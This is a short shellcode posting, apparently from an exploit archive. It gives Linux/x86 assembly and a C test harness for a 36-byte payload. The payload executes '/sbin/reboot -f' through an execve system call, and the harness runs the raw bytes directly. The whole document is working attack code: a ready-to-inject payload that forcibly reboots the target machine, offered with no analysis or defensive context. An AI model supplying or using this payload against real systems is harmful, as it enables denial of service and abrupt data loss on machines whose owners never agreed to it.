**********************************************
* Linux/x86 Force Reboot shellcode 36 bytes  *
**********************************************
* Author: Hamza Megahed                      *
**********************************************
* Twitter: @Hamza_Mega                       *
**********************************************
* blog: hamza-mega[dot]blogspot[dot]com      *
**********************************************
* E-mail: hamza[dot]megahed[at]gmail[dot]com *
**********************************************

xor    %eax,%eax
push   %eax
push   $0x746f6f62
push   $0x65722f6e
push   $0x6962732f
mov    %esp,%ebx
push   %eax
pushw  $0x662d
mov    %esp,%esi
push   %eax
push   %esi
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

**********************************************

#include <stdio.h>
#include <string.h>

char *shellcode = "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e"
                  "\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3"
                  "\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53"
                  "\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}